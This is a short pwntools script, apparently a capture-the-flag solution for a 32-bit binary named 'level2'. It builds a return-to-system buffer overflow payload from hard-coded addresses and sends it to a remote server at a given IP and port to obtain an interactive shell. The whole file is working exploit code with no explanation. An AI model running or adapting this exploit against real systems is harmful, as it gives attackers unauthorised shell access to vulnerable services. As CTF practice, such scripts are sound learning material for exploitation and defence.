# data address:0x0804A024
# system address:0x8048320


from pwn import *
# context.terminal=['tmux','splitw','-h']
context.log_level='debug'

p=remote("121.37.132.113",10001)

# p=process("./level2")
payload=136*b'A'+4*b'B'+p32(0x8048320)+4*b'0'+p32(0x0804A024)
# payload=b'233'
p.sendafter(b'Input:\n',payload)
# p.sendline(payload)
p.interactive()